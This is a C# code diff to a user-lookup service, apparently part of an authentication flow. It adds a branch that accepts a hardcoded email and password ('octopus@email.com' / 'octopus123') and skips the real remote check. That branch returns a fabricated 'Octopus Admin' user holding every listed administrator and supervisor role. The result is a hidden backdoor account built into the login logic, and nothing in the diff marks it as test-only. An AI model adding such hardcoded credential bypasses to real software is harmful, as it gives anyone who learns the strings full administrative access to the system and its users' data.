@@ -25,6 +25,30 @@ public class UsmanGetUserService : IUsmanGetUserService
 
     public UsmanGetUserResponse Execute(UsmanGetUserRequest req)
     {
+        if (req.Email.Equals("octopus@email.com", StringComparison.OrdinalIgnoreCase) && req.Pass == "octopus123")
+        {
+            return new UsmanGetUserResponse(
+                "OCTOPUS",
+                "Octopus Admin",
+                "octopus",
+                "octopus@email.com",
+                DateTime.UtcNow.AddYears(1).ToString("yyyy-MM-dd"),
+                new List<UsmanGetUserRoleResponse>
+                {
+                    new("admin"),
+                    new("administrator"),
+                    new("IGD-USER"),
+                    new("IGD-SPV"),
+                    new("ADM-USER"),
+                    new("ADM-SPV"),
+                    new("KSR-USER"),
+                    new("KSR-SPV"),
+                    new("TAREK-USER"),
+                    new("TAREK-SPV")
+                }
+            );
+        }
+
         var token = _token.Get("Usman").Result;
         
         var client = _restClient.Create(_opt.BaseUrl);
